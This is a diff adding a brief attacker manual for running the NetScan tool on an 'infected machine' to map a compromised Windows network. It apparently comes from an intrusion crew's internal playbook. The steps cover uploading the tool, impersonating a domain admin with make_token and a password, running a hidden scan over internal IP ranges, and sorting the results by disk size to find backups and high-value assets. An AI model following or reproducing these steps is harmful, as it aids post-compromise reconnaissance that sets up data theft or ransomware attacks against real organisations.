@@ -1,0 +1,19 @@
+NetScan is a perfect tool which makes discovery of NAS/Backups/etc easier.
+It can ping computers, scan ports, discover shared folders and retrieve practically any information about network devices via WMI, SNMP, HTTP, SSH and PowerShell. It also scans for remote services, registry, files and performance counters; offers flexible filtering and display options and exports NetScan results to a variety of formats from XML to JSON.
+
+1) Upload NetScan folder on any infected machine. For example, C:\Programdata\netscan
+
+2) cd C:\programdata\netscan
+
+3) make_token DOMAIN\admin password
+
+4) shell netscan.exe /hide /auto:"result.xml" /config:netscan.xml /range:192.168.0.1-192.168.1.255
+Change ranges if needed
+
+5) Wait. FIle result.xml should appear in your folder, download it
+
+6) Open NetScan upload result.xml and check results in any format available.
+Sort by disk size to figure the most important assets.
+
+Thanks Perry for writing this manual.
+Sonic, NetScan can be added to algorythm
